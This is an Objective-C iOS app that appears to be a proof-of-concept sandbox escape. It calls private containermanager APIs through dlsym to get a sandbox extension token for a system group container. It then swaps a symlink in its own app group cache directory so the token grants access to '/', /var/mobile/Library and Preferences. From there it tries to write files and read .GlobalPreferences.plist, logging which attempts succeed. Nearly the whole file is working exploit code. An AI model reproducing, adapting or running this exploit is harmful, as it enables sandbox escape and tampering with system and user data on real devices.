#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>
#import <sys/stat.h>
#import <string.h>
typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef const char *(*fn_get_path)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);
static fn_create q_create; static fn_set_u64 q_class,q_part,q_flags; static fn_set_obj q_group; static fn_get_one q_get; static fn_copy_token q_token; static fn_get_path q_path; static fn_free q_free; static fn_consume s_consume; static fn_release s_release; static fn_xpc_string xpc_string; static fn_xpc_release xpc_release_fn;
static NSMutableString *gLog; static NSString *gPath; static NSString *gGroup,*gPart,*gValid;
static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [gLog appendString:s]; [gLog appendString:@"\n"];
    [gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    NSLog(@"[mcmy] %@", s);
}
static BOOL loadMCM(void){void*h=dlopen("/usr/lib/system/libsystem_containermanager.dylib",RTLD_NOW|RTLD_LOCAL);if(!h){L(@"dlopen fail %s",dlerror());return NO;}q_create=dlsym(h,"container_query_create");q_class=dlsym(h,"container_query_set_class");q_group=dlsym(h,"container_query_set_group_identifiers");q_part=dlsym(h,"container_query_operation_set_part");q_flags=dlsym(h,"container_query_operation_set_flags");q_get=dlsym(h,"container_query_get_single_result");q_token=dlsym(h,"container_copy_sandbox_token");q_path=dlsym(h,"container_object_get_path");q_free=dlsym(h,"container_query_free");s_consume=dlsym(RTLD_DEFAULT,"sandbox_extension_consume");s_release=dlsym(RTLD_DEFAULT,"sandbox_extension_release");xpc_string=dlsym(RTLD_DEFAULT,"xpc_string_create");xpc_release_fn=dlsym(RTLD_DEFAULT,"xpc_release");L(@"[load] create=%p get=%p tok=%p consume=%p",q_create,q_get,q_token,s_consume);return q_create&&q_get&&q_token&&s_consume;}
static NSString *findGroup(void){NSArray*ids=@[@"group.8e0bc870a21520b9.1",@"group.8e0bc870a21520b9.4",@"group.8e0bc870a21520b9.5",@"group.8e0bc870a21520b9.3",@"group.8e0bc870a21520b9.2"];for(NSString*g in ids){NSURL*u=[[NSFileManager defaultManager]containerURLForSecurityApplicationGroupIdentifier:g];if(u.path.length)return g;}return nil;}
static int64_t queryPart(int part, NSString **pathOut){void*q=q_create();q_class(q,7);void*x=xpc_string?xpc_string(gGroup.UTF8String):NULL;q_group(q,x);q_part(q,part);q_flags(q,0x8000000000ULL);void*res=q_get(q);const char*p=(res&&q_path)?q_path(res):NULL;char*tok=(res&&q_token)?q_token(res):NULL;int64_t h=(tok&&s_consume)?s_consume(tok):-5;if(pathOut)*pathOut=p?[NSString stringWithUTF8String:p]:nil;if(tok)free(tok);if(q_free)q_free(q);if(x&&xpc_release_fn)xpc_release_fn(x);return h;}
static void trywrite(NSString *tag, NSString *path){errno=0;int fd=open(path.fileSystemRepresentation,O_CREAT|O_WRONLY|O_TRUNC,0644);int e=errno;L(@"[w %@] open=%d errno=%d path=%@",tag,fd,e,path);if(fd>=0){ssize_t n=write(fd,"MCMY_WIN",8);close(fd);struct stat st;int lr=lstat(path.fileSystemRepresentation,&st);L(@"[w %@] *** WRITE OK *** n=%zd lstat=%d size=%lld mode=%o",tag,n,lr,lr?0:(long long)st.st_size,lr?0:st.st_mode);}}
static void tryread(NSString *tag, NSString *path){errno=0;int fd=open(path.fileSystemRepresentation,O_RDONLY);int e=errno;L(@"[r %@] open=%d errno=%d path=%@",tag,fd,e,path);if(fd>=0){char b[32]={0};ssize_t n=read(fd,b,31);L(@"[r %@] read=%zd first=%s",tag,n,n>0?b:"");close(fd);}}
static void swapTo(NSString *target){unlink(gPart.fileSystemRepresentation);int rc=symlink(target.fileSystemRepresentation,gPart.fileSystemRepresentation);L(@"[swap] -> %@ rc=%d errno=%d",target,rc,errno);}
static void run(void){
    @autoreleasepool {
        L(@"=== mcmy start uid=%d pid=%d", getuid(), getpid());
        if(!loadMCM()){return;}
        gGroup=findGroup(); if(!gGroup){L(@"no group");return;}
        NSString *root=[[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gGroup].path;
        gPart=[root stringByAppendingPathComponent:@"Library/Caches"];
        gValid=@"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
        NSFileManager *fm=[NSFileManager defaultManager];
        [fm createDirectoryAtPath:[gPart stringByDeletingLastPathComponent] withIntermediateDirectories:YES attributes:nil error:nil];
        [fm removeItemAtPath:gPart error:nil];
        swapTo(gValid);
        NSString *p=nil; int64_t h=queryPart(3,&p);
        L(@"[token3] h=%lld path=%@",(long long)h,p?:@"(null)");
        L(@"[ctl] opendir prefs BEFORE swap=%p errno=%d",opendir("/var/mobile/Library/Preferences"),errno);
        if(h>=0){
            trywrite(@"control-gValid",[gValid stringByAppendingPathComponent:@"mcmy_ctl"]);
            swapTo(@"/");
            trywrite(@"root-via-part",[gPart stringByAppendingPathComponent:@"tmp/mcmy_root"]);
            trywrite(@"prefs-via-part",[gPart stringByAppendingPathComponent:@"var/mobile/Library/Preferences/mcmy_prefs"]);
            tryread(@"globalprefs-via-part",[gPart stringByAppendingPathComponent:@"var/mobile/Library/Preferences/.GlobalPreferences.plist"]);
            swapTo(@"/var/mobile/Library");
            trywrite(@"lib-via-part",[gPart stringByAppendingPathComponent:@"Preferences/mcmy_prefs2"]);
            swapTo(@"/var/mobile");
            trywrite(@"mobile-via-part",[gPart stringByAppendingPathComponent:@"Library/Preferences/mcmy_prefs3"]);
            if(s_release)s_release(h);
        }
        swapTo(gValid);
        L(@"=== mcmy done ===");
    }
}
@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];UIViewController*vc=[UIViewController new];vc.view.backgroundColor=UIColor.blackColor;UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds];tv.backgroundColor=UIColor.blackColor;tv.textColor=UIColor.greenColor;tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];tv.editable=NO;tv.text=@"MCMY";[vc.view addSubview:tv];self.window.rootViewController=vc;[self.window makeKeyAndVisible];[UIApplication sharedApplication].idleTimerDisabled=YES;NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES)firstObject];gPath=[[docs stringByAppendingPathComponent:@"mcmy.log"]copy];gLog=[NSMutableString new];dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0),^{run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});return YES;}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
